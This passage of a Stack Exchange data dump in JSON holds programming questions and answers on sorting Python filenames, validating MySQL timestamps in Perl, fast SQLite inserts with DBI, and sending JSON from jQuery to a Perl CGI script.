'qd-p8-dPZ-d8-z16-1nn.q', 'qd-p8-dPZ-d8-z16-2nn.q',\n             'qd-p8-dPZ-d8-z16-4nn.q', 'qd-p8-dPZ-d8-z16-8nn.q',\n             'qd-p8-dPZ-d8-z1-8nn.q', 'qd-p8-dPZ-d8-z2-1nn.q',\n             'qd-p8-dPZ-d8-z2-2nn.q', 'qd-p8-dPZ-d8-z2-4nn.q',\n             'qd-p8-dPZ-d8-z2-8nn.q', 'qd-p8-dPZ-d8-z32-1nn.q',\n             'qd-p8-dPZ-d8-z32-2nn.q', 'qd-p8-dPZ-d8-z32-4nn.q',\n             'qd-p8-dPZ-d8-z32-8nn.q', 'qd-p8-dPZ-d8-z4-1nn.q',\n             'qd-p8-dPZ-d8-z4-2nn.q', 'qq-p8-dZP-d8-z1-2nn.q',\n             'qq-p8-dZP-d8-z1-4nn.q', 'qq-p8-dZP-d8-z16-1nn.q',\n             'qq-p8-dZP-d8-z16-2nn.q', 'qq-p8-dZP-d8-z16-4nn.q',\n             'qq-p8-dZP-d8-z16-8nn.q', 'qq-p8-dZP-d8-z1-8nn.q',\n             'qq-p8-dZP-d8-z2-1nn.q', 'qq-p8-dZP-d8-z2-2nn.q',\n             'qq-p8-dZP-d8-z2-4nn.q', 'qq-p8-dZP-d8-z2-8nn.q',\n             'qq-p8-dZP-d8-z32-1nn.q', 'qq-p8-dZP-d8-z32-2nn.q',\n             'qq-p8-dZP-d8-z32-4nn.q', 'qq-p8-dZP-d8-z32-8nn.q',\n             'qq-p8-dZP-d8-z4-1nn.q', 'qq-p8-dZP-d8-z4-2nn.q',\n             'qq-p8-dZP-d8-z4-4nn.q']\n\nfilename_order = ('p', 'd', 'z', 'nn')  # order fields occur in the filenames\nfieldname_order = ('z', 'd', 'p', 'nn')  # desired field sort order\nOrderedTuple = namedtuple('OrderedTuple', fieldname_order)\n\ndef keyfunc(filename):\n    values = [int(value) for value in re.findall(r'-\\D*(\\d+)', filename)]\n    parts = dict(zip(filename_order, values))\n    return OrderedTuple(**parts)\n\nfilenames.sort(key=keyfunc)  # sort filename list in-place\n</code></pre>\n\n<p>Resulting order of filenames in list:</p>\n\n<pre><code>['qd-p8-dPZ-d8-z1-1nn.q', 'qd-p8-dPZ-d8-z1-2nn.q', 'qq-p8-dZP-d8-z1-2nn.q',\n 'qd-p8-dPZ-d8-z1-4nn.q', 'qq-p8-dZP-d8-z1-4nn.q', 'qd-p8-dPZ-d8-z1-8nn.q',\n 'qq-p8-dZP-d8-z1-8nn.q', 'qd-p8-dPZ-d8-z2-1nn.q', 'qq-p8-dZP-d8-z2-1nn.q',\n 'qd-p8-dPZ-d8-z2-2nn.q', 'qq-p8-dZP-d8-z2-2nn.q', 'qd-p8-dPZ-d8-z2-4nn.q',\n 'qq-p8-dZP-d8-z2-4nn.q', 'qd-p8-dPZ-d8-z2-8nn.q', 'qq-p8-dZP-d8-z2-8nn.q',\n 'qd-p8-dPZ-d8-z4-1nn.q', 'qq-p8-dZP-d8-z4-1nn.q', 'qd-p8-dPZ-d8-z4-2nn.q',\n 'qq-p8-dZP-d8-z4-2nn.q', 'qq-p8-dZP-d8-z4-4nn.q',\n 'qd-p64-dZP-d64-z8-8nn.q', 'qd-p8-dPZ-d8-z16-1nn.q',\n 'qq-p8-dZP-d8-z16-1nn.q', 'qd-p8-dPZ-d8-z16-2nn.q',\n 'qq-p8-dZP-d8-z16-2nn.q', 'qd-p8-dPZ-d8-z16-4nn.q',\n 'qq-p8-dZP-d8-z16-4nn.q', 'qd-p8-dPZ-d8-z16-8nn.q',\n 'qq-p8-dZP-d8-z16-8nn.q', 'qd-p8-dPZ-d8-z32-1nn.q',\n 'qq-p8-dZP-d8-z32-1nn.q', 'qd-p8-dPZ-d8-z32-2nn.q',\n 'qq-p8-dZP-d8-z32-2nn.q', 'qd-p8-dPZ-d8-z32-4nn.q',\n 'qq-p8-dZP-d8-z32-4nn.q', 'qd-p8-dPZ-d8-z32-8nn.q',\n 'qq-p8-dZP-d8-z32-8nn.q']\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 4677675, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-k-G6DF1UlpA/AAAAAAAAAAI/AAAAAAAAFS8/jheFzG8dZqs/photo.jpg?sz=128", "display_name": "Diego Calzadilla Hern&#225;ndez", "link": "https://stackoverflow.com/users/4677675/diego-calzadilla-hern%c3%a1ndez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 33557928, "answer_count": 2, "score": -3, "last_activity_date": 1496712138, "creation_date": 1446769952, "last_edit_date": 1496712138, "question_id": 33557428, "link": "https://stackoverflow.com/questions/33557428/python-how-to-iterate-through-set-of-files-based-on-file-names", "title": "Python: How to iterate through set of files based on file names?", "body": "<p>I have a set of files named like this:</p>\n\n<pre><code>qd-p64-dZP-d64-z8-8nn.q         \nqd-p8-dPZ-d8-z1-1nn.q             qq-p8-dZP-d8-z1-2nn.q\nqd-p8-dPZ-d8-z1-2nn.q             qq-p8-dZP-d8-z1-4nn.q\nqd-p8-dPZ-d8-z1-4nn.q             qq-p8-dZP-d8-z16-1nn.q\nqd-p8-dPZ-d8-z16-1nn.q            qq-p8-dZP-d8-z16-2nn.q\nqd-p8-dPZ-d8-z16-2nn.q            qq-p8-dZP-d8-z16-4nn.q\nqd-p8-dPZ-d8-z16-4nn.q            qq-p8-dZP-d8-z16-8nn.q\nqd-p8-dPZ-d8-z16-8nn.q            qq-p8-dZP-d8-z1-8nn.q\nqd-p8-dPZ-d8-z1-8nn.q             qq-p8-dZP-d8-z2-1nn.q\nqd-p8-dPZ-d8-z2-1nn.q             qq-p8-dZP-d8-z2-2nn.q\nqd-p8-dPZ-d8-z2-2nn.q             qq-p8-dZP-d8-z2-4nn.q \nqd-p8-dPZ-d8-z2-4nn.q             qq-p8-dZP-d8-z2-8nn.q\nqd-p8-dPZ-d8-z2-8nn.q             qq-p8-dZP-d8-z32-1nn.q\nqd-p8-dPZ-d8-z32-1nn.q            qq-p8-dZP-d8-z32-2nn.q\nqd-p8-dPZ-d8-z32-2nn.q            qq-p8-dZP-d8-z32-4nn.q\nqd-p8-dPZ-d8-z32-4nn.q            qq-p8-dZP-d8-z32-8nn.q\nqd-p8-dPZ-d8-z32-8nn.q            qq-p8-dZP-d8-z4-1nn.q\nqd-p8-dPZ-d8-z4-1nn.q             qq-p8-dZP-d8-z4-2nn.q\nqd-p8-dPZ-d8-z4-2nn.q             qq-p8-dZP-d8-z4-4nn.q\n</code></pre>\n\n<p>The information to iterate is given in the file names, for example:</p>\n\n<p>Fix </p>\n\n<pre><code>dZP, 1nn, z2,  \n</code></pre>\n\n<p>and vary </p>\n\n<pre><code>d \n</code></pre>\n\n<p>with values</p>\n\n<pre><code>{d8, d16, d32 d64}\n</code></pre>\n\n<p>Then, increase z value to get </p>\n\n<pre><code>dZP, 1nn, z4\n</code></pre>\n\n<p>and vary d again</p>\n\n<pre><code>{d8, d16, d32 d64}   \n</code></pre>\n\n<p>Once I'm able to iterate like this I need to do some information processing     from the files.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446767175, "post_id": 33556745, "comment_id": 54893522, "body": "Would it not be enough to just check the rough structure? Maybe like <code>&#47;^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}$&#47;</code>?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1446767572, "post_id": 33556745, "comment_id": 54893646, "body": "What else can it contain?"}, {"owner": {"reputation": 2920, "user_id": 3360140, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/OThx0.jpg?s=128&g=1", "display_name": "Kamrul Khan", "link": "https://stackoverflow.com/users/3360140/kamrul-khan"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446768100, "post_id": 33556745, "comment_id": 54893828, "body": "@MattJacob yeh that will probably work as well. But, I was wondering if there&#39;s any BIF for that."}, {"owner": {"reputation": 2920, "user_id": 3360140, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/OThx0.jpg?s=128&g=1", "display_name": "Kamrul Khan", "link": "https://stackoverflow.com/users/3360140/kamrul-khan"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1446768141, "post_id": 33556745, "comment_id": 54893843, "body": "@choroba it can contain timezone info like Asia/Hongkong"}], "answers": [{"tags": [], "owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "is_accepted": true, "score": 2, "last_activity_date": 1446772229, "creation_date": 1446772229, "answer_id": 33557814, "question_id": 33556745, "link": "https://stackoverflow.com/questions/33556745/perl-check-if-a-string-contains-mysql-timestamp/33557814#33557814", "title": "Perl check if a string contains mysql timestamp", "body": "<p>You can use the Perl module DateTime::Format::MySQL. Its <code>parse_datetime</code> method will throw an exception if the input format isn't acceptable, or will return a DateTime object if it can be parsed as a MySQL datetime.  It seems to be pretty strict, which may be what you want.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse DateTime::Format::MySQL;\n\nwhile(&lt;DATA&gt;){\n    chomp;\n    print \"$_: \";\n    my $result = validate_date($_);\n    print defined $result\n        ? \"Recognized format. ($result)\\n\"\n        : \"Unrecognized format.\\n\";\n}\n\nsub validate_date {\n    return eval {DateTime::Format::MySQL-&gt;parse_datetime(shift)};\n}\n\n__DATA__\n2015-11-21 13:45:20\n2015-11-21 13 : 45 : 20\n</code></pre>\n\n<p>With a DateTime object, and in particular, with the DateTime::Format::MySQL module it's pretty easy to turn around and output MySQL-ready datetime strings.</p>\n\n<p>On the other hand, if the goal is to accept input, validate it, and then send it out to MySQL, you might consider using the <code>parse_datetime</code> method from DateTime::Format::DateParse to accept as wide a variety of date strings as practical. That module returns a DateTime object. Then you can use the DateTime::Format::MySQL method, <code>format_datetime</code> to convert that DT object to a useful MySQL format.  That way you are being liberal in what you accept, but strict in what you output, which is often a reasonable design pattern.</p>\n"}], "owner": {"reputation": 2920, "user_id": 3360140, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/OThx0.jpg?s=128&g=1", "display_name": "Kamrul Khan", "link": "https://stackoverflow.com/users/3360140/kamrul-khan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 290, "favorite_count": 0, "accepted_answer_id": 33557814, "answer_count": 1, "score": 0, "last_activity_date": 1446772229, "creation_date": 1446765943, "question_id": 33556745, "link": "https://stackoverflow.com/questions/33556745/perl-check-if-a-string-contains-mysql-timestamp", "title": "Perl check if a string contains mysql timestamp", "body": "<p>I have a variable $data that may or may not contain a mysql timestamp. I want to check if it actually contains a timestamp or not. </p>\n\n<pre><code>$data = '2015-11-21 13:45:20';\n</code></pre>\n\n<p>I can probably check it using a big regex like </p>\n\n<pre><code>/2[0-9][0-9][0-9]-(0[1-9]|1[0-2])-(0[1-9]|2[0-9]|3[0-1]) ([01][0-9]|2[0-4]):[0-5][0-9]:[0-5][0-9]/\n</code></pre>\n\n<p>But is there an easier way ?</p>\n"}, {"tags": ["perl", "sqlite", "dbi"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1446824491, "post_id": 33556610, "comment_id": 54918799, "body": "I&#39;m not surprised by your results. I haven&#39;t used SQLite much, but at least with MySQL, batched inserts of more than just a few rows are much faster than inserting each row individually. This makes sense: every insert requires talking to the database, which has a certain amount of overhead associated with it."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1446824538, "post_id": 33556610, "comment_id": 54918826, "body": "Also, for an even greater number of rows, importing a CSV using the DBMS&#39;s native import capability is probably even faster (MySQL&#39;s <code>LOAD DATA INFILE</code> is much faster than batched imports for my particular application when inserting &gt; ~100 rows). SQLite <a href=\"https://www.sqlite.org/cli.html#csv\" rel=\"nofollow noreferrer\">has a CSV import command</a>, but I&#39;m not sure if you can use it via DBI."}], "answers": [{"comments": [{"owner": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "edited": false, "score": 0, "creation_date": 1446779620, "post_id": 33557453, "comment_id": 54896913, "body": "had not thought about autocommit. will try tomorrow thanks."}, {"owner": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "edited": false, "score": 1, "creation_date": 1447712020, "post_id": 33557453, "comment_id": 55259677, "body": "I finally got around to testing this. you were right. disabling autocommit is really really fast. thank you."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "reply_to_user": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "edited": false, "score": 0, "creation_date": 1447729003, "post_id": 33557453, "comment_id": 55264904, "body": "@beasy Glad to be of help. Glad that solved your problem."}], "tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": true, "score": 4, "last_activity_date": 1446770455, "last_edit_date": 1446770455, "creation_date": 1446770069, "answer_id": 33557453, "question_id": 33556610, "link": "https://stackoverflow.com/questions/33556610/dbdsqlite-fastest-way-to-insert-multiple-rows/33557453#33557453", "title": "DBD::SQLite fastest way to insert multiple rows", "body": "<p>See in the example below where autocommit is set to 0</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse DBI;\n\nmy $dbh = DBI-&gt;connect(\"dbi:SQLite:dbname=pedro.lite\",\"\",\"\",\n    {PrintError =&gt; 1, AutoCommit =&gt; 0}) or die \"Can't connect\";\n\nmy $sth = $dbh-&gt;prepare(q{INSERT INTO purchases VALUES(?,?,?,?)})\n    or die $dbh-&gt;errstr;\n\nwhile (&lt;DATA&gt;) {\n    chomp;\n    $sth-&gt;execute( split /\\|/ );\n}\n\n$dbh-&gt;commit() or die $dbh-&gt;errstr;\n\n__DATA__\nPedro|groceries|apple|1.42 \nNitin|tobacco|cigarettes|15.00 \nSusie|groceries|cereal|5.50 \nSusie|groceries|milk|4.75 \nSusie|tobacco|cigarettes|15.00 \nSusie|fuel|gasoline|44.90 \nPedro|fuel|propane|9.60 \n</code></pre>\n\n<p>This disables the commit until all records are inserted. In practice, you may not want to wait to commit if there is a lot of inserts - perhaps every 5000 inserts or whatever you feel is best. By not committing, if there is an error or computer shutdown, then you will only have created the number of records at the last commit - a difficult situation.</p>\n"}], "owner": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1347, "favorite_count": 0, "accepted_answer_id": 33557453, "answer_count": 1, "score": 3, "last_activity_date": 1446779292, "creation_date": 1446765224, "last_edit_date": 1446779292, "question_id": 33556610, "link": "https://stackoverflow.com/questions/33556610/dbdsqlite-fastest-way-to-insert-multiple-rows", "title": "DBD::SQLite fastest way to insert multiple rows", "body": "<p>I have tried 3 different approaches to inserting multiple (over 500) rows into a SQLite table. Counter-intuitively, approach 3 below is the fastest. I would have assumed approach 2 would be the fastest because it uses a \"prepared\" statement handle. But my third approach - inserting 500 rows at a time (500 is apparently the max allowed in SQLite) - is way faster. </p>\n\n<p>Am I missing anything? Should I continue with the 500 approach, or is there another way?</p>\n\n<p>note: the below code is not my actual code, I just wrote it here for example purposes and has not been tested. </p>\n\n<pre><code>use strict; \nuse warnings;\nuse DBI;\n\nmy $dsn = \"DBI:SQLite:dbname=db\";\nmy $dbh = DBI-&gt;connect($dsn,\"\",\"\");\n\nopen my $data_file,\"&lt;\",\"data.txt\"; # 3 integer fields per line\n\nAPPROACH_1:\nwhile (&lt;$data_file&gt;) {\n    my @fields = split \"\\t\";\n    my $insert = join \",\", @fields;\n    $dbh-&gt;do(\"insert into table values ($insert)\";\n}\n\nAPPROACH_2:\nmy $sql = \"insert into table values (?,?,?)\";\nmy $sth = $dbh-&gt;prepare($sql);\nwhile (&lt;$data_file&gt;) {\n    my @fields = split \"\\t\";\n    $sth-&gt;execute(@fields);\n}\n\nAPPROACH_3:\nmy @inserts;\nwhile (&lt;$data_file&gt;) {\n    my @fields = split \"\\t\";\n    my $insert = '('.join(\",\",@fields).')';\n    push @inserts, $insert;\n    if (@inserts == 500) {\n        my $insert_500 = join \",\", @inserts;\n        $dbh-&gt;do(\"insert into table values $insert_500\";\n        undef @inserts;\n    }\n}\n# insert leftovers\n</code></pre>\n"}, {"tags": ["arrays", "perl", "while-loop"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1446762604, "post_id": 33555910, "comment_id": 54891819, "body": "You should probably start by creating the array... <code>my @foo;</code> and then adding to it: <code>push(@foo, $number);</code>"}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 1, "creation_date": 1446763025, "post_id": 33555910, "comment_id": 54891987, "body": "Your print is not correct: <code>-1</code> does not end your loop, but <code>0</code> does."}], "answers": [{"tags": [], "owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "is_accepted": false, "score": 0, "last_activity_date": 1446763404, "creation_date": 1446763404, "answer_id": 33556206, "question_id": 33555910, "link": "https://stackoverflow.com/questions/33555910/can-you-use-user-entered-data-from-a-while-loop-and-put-it-into-a-loop/33556206#33556206", "title": "Can you use user entered data from a while loop and put it into a loop", "body": "<p>The simplest way to collect data in a loop would be something like this:</p>\n\n<pre><code>while (&lt;&gt;) {\n    chomp;\n    last if $_ &lt; 0;        # -1 ends the loop\n    push @array, $_;       # save number\n\n    if ($_ &lt; $smallest) {\n        $smallest = $_;\n    }\n    elsif ($_ &gt; $largest) {\n        $largest = $_;\n    }\n}\n</code></pre>\n\n<p>Using a <code>while (&lt;&gt;)</code> is the idiomatic way, so that is why I am using it here.</p>\n\n<p>You could also put it together, and use the array to find the smallest and largest number:</p>\n\n<pre><code>while (&lt;&gt;) {\n    chomp;\n    last if $_ &lt; 0;\n    push @array, $_;\n}\n\n@array = sort { $a &lt;=&gt; $b } @array;\nprint \"\\n$array[0]:$array[-1]\\n\";\n</code></pre>\n\n<p>Here you simply sort the array and then use the first and last element.</p>\n"}], "owner": {"reputation": 9, "user_id": 5425640, "user_type": "registered", "profile_image": "https://graph.facebook.com/10200949049525946/picture?type=large", "display_name": "Jared Patrick Gibson", "link": "https://stackoverflow.com/users/5425640/jared-patrick-gibson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 32, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1446763404, "creation_date": 1446762088, "question_id": 33555910, "link": "https://stackoverflow.com/questions/33555910/can-you-use-user-entered-data-from-a-while-loop-and-put-it-into-a-loop", "title": "Can you use user entered data from a while loop and put it into a loop", "body": "<p>I would like to take this user data entered and put it into an array and I cant seem to figure out how to do it though.</p>\n\n<pre><code>#!/usr/bin/perl\nuse Modern::Perl;\nuse diagnostics;\n\nmy ($number,$smallest,$largest);\nprint \"\\nPlease enter a number or -1 to end,Press enter after every number  entered\\n\";\nchomp ($number =&lt;&gt;);\n$smallest = $number;\n\n$largest=$number; \nwhile($number !=0) \n{\n$smallest = $number if $number &lt; $smallest;\n$largest  = $number if $number &gt; $largest;\nchomp ($number=&lt;&gt;);\n}\nprint \"\\n$smallest:$largest\\n\";\n</code></pre>\n"}, {"tags": ["json", "ajax", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1446758863, "post_id": 33554905, "comment_id": 54889859, "body": "You need to call <code>JSON.stringify()</code> on the object you put into the request, and then you need to decode the JSON string in your Perl code."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1446758946, "post_id": 33554905, "comment_id": 54889898, "body": "Also, you should edit your post to include the output you <i>are</i> seeing, rather than just saying that, essentially, &quot;it&#39;s not working&quot;."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447178988, "post_id": 33554905, "comment_id": 55047294, "body": "Did my answer solve your problem?"}, {"owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457549599, "post_id": 33554905, "comment_id": 59460796, "body": "Thanks for the help, Matt. Yes this does work."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457557745, "post_id": 33554905, "comment_id": 59465625, "body": "Great! Please see: <a href=\"http://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1446789918, "last_edit_date": 1446789918, "creation_date": 1446788972, "answer_id": 33560314, "question_id": 33554905, "link": "https://stackoverflow.com/questions/33554905/how-to-send-json-via-javascript-and-decode-it-in-perl/33560314#33560314", "title": "How to send JSON via JavaScript and decode it in Perl?", "body": "<p>You need to call <code>JSON.stringify()</code> on your object before making the request:</p>\n\n<pre><code>$.ajax({\n    type: 'POST',\n    url: '/cgi-bin/Raghav_test/Apollo/read_ajax3.pl',\n    data: { \"r\": JSON.stringify(d) },\n    success: function(res) { alert(\"data\" + res); },\n    error: function() { alert(\"did not work\"); }\n});\n</code></pre>\n\n<p>And then you need to call <code>decode_json()</code> on the string to parse it and turn it into a Perl data structure:</p>\n\n<pre><code>my $q    = CGI-&gt;new;\nmy $json = $q-&gt;param(\"r\");\nmy $href = decode_json($json);\n\nprint Dumper($href);\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$VAR1 = {\n          'address' =&gt; {\n                         'state' =&gt; 'California',\n                         'city' =&gt; 'San Jose'\n                       },\n          'name' =&gt; 'Bob',\n          'friends' =&gt; [\n                         {\n                           'name' =&gt; 'Alice',\n                           'age' =&gt; '20'\n                         },\n                         {\n                           'age' =&gt; '23',\n                           'name' =&gt; 'Laura'\n                         },\n                         {\n                           'name' =&gt; 'Daniel',\n                           'age' =&gt; '30'\n                         }\n                       ],\n          'sex' =&gt; 'Male'\n        };\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1332, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1446791422, "creation_date": 1446758069, "last_edit_date": 1446791422, "question_id": 33554905, "link": "https://stackoverflow.com/questions/33554905/how-to-send-json-via-javascript-and-decode-it-in-perl", "title": "How to send JSON via JavaScript and decode it in Perl?", "body": "<p>I am trying to POST JSON using JavaScript and read the POST results using a Perl script. I have written this code but am unable to get the Perl script to read in the JSON text.</p>\n\n<p>HTML:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Testing ajax&lt;/title&gt;\n&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\nvar d = {\n    \"name\": \"Bob\",\n    \"sex\": \"Male\",\n    \"address\": {\n        \"city\": \"San Jose\",\n        \"state\": \"California\"\n    },\n    \"friends\": [\n        {\n            \"name\": \"Alice\",\n            \"age\": \"20\"\n        },\n        {\n            \"name\": \"Laura\",\n            \"age\": \"23\"\n        },\n        {\n            \"name\": \"Daniel\",\n            \"age\": \"30\"\n        }\n    ]\n};\n\n$(document).ready(function() {\n    $(\"#test\").click(function() {\n        $.ajax({\n            type: 'POST',\n            url: '/cgi-bin/Raghav_test/Apollo/read_ajax3.pl',\n            data: \"r=\" + d,\n            success: function(res) { alert(\"data\" + res); },\n            error: function() { alert(\"did not work\"); }\n        });\n    });\n});\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;button id=\"test\"&gt;Testing&lt;/button&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Perl:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse CGI;\n#use DBD;\nuse DBI;\nuse JSON::PP;\nuse Data::Dumper;\nuse DBD::Oracle qw(:ora_types);\nuse lib \"/var/www/cgi-bin/ICE_LIBRARY/\";\n\nrequire '/var/www/cgi-bin/import_scripts/library/common_lib.pl';\nrequire \"/var/www/cgi-bin/import_scripts/library/script_log.pl\";\n\nuse database_conf;\nmy $db = new database_conf;\n\n#my $EP_dev_conn = $db-&gt;db_eportal_dev;\nmy $EP_prod_conn = $db-&gt;db_eportal_prod;\nmy $cgi = CGI-&gt;new;\nmy $id = $cgi-&gt;param(\"r\");\n#my $data = $cgi-&gt;param('POSTDATA');\n\nprint \"Content-type:text/html\\n\\n\";\n\n#my $value =  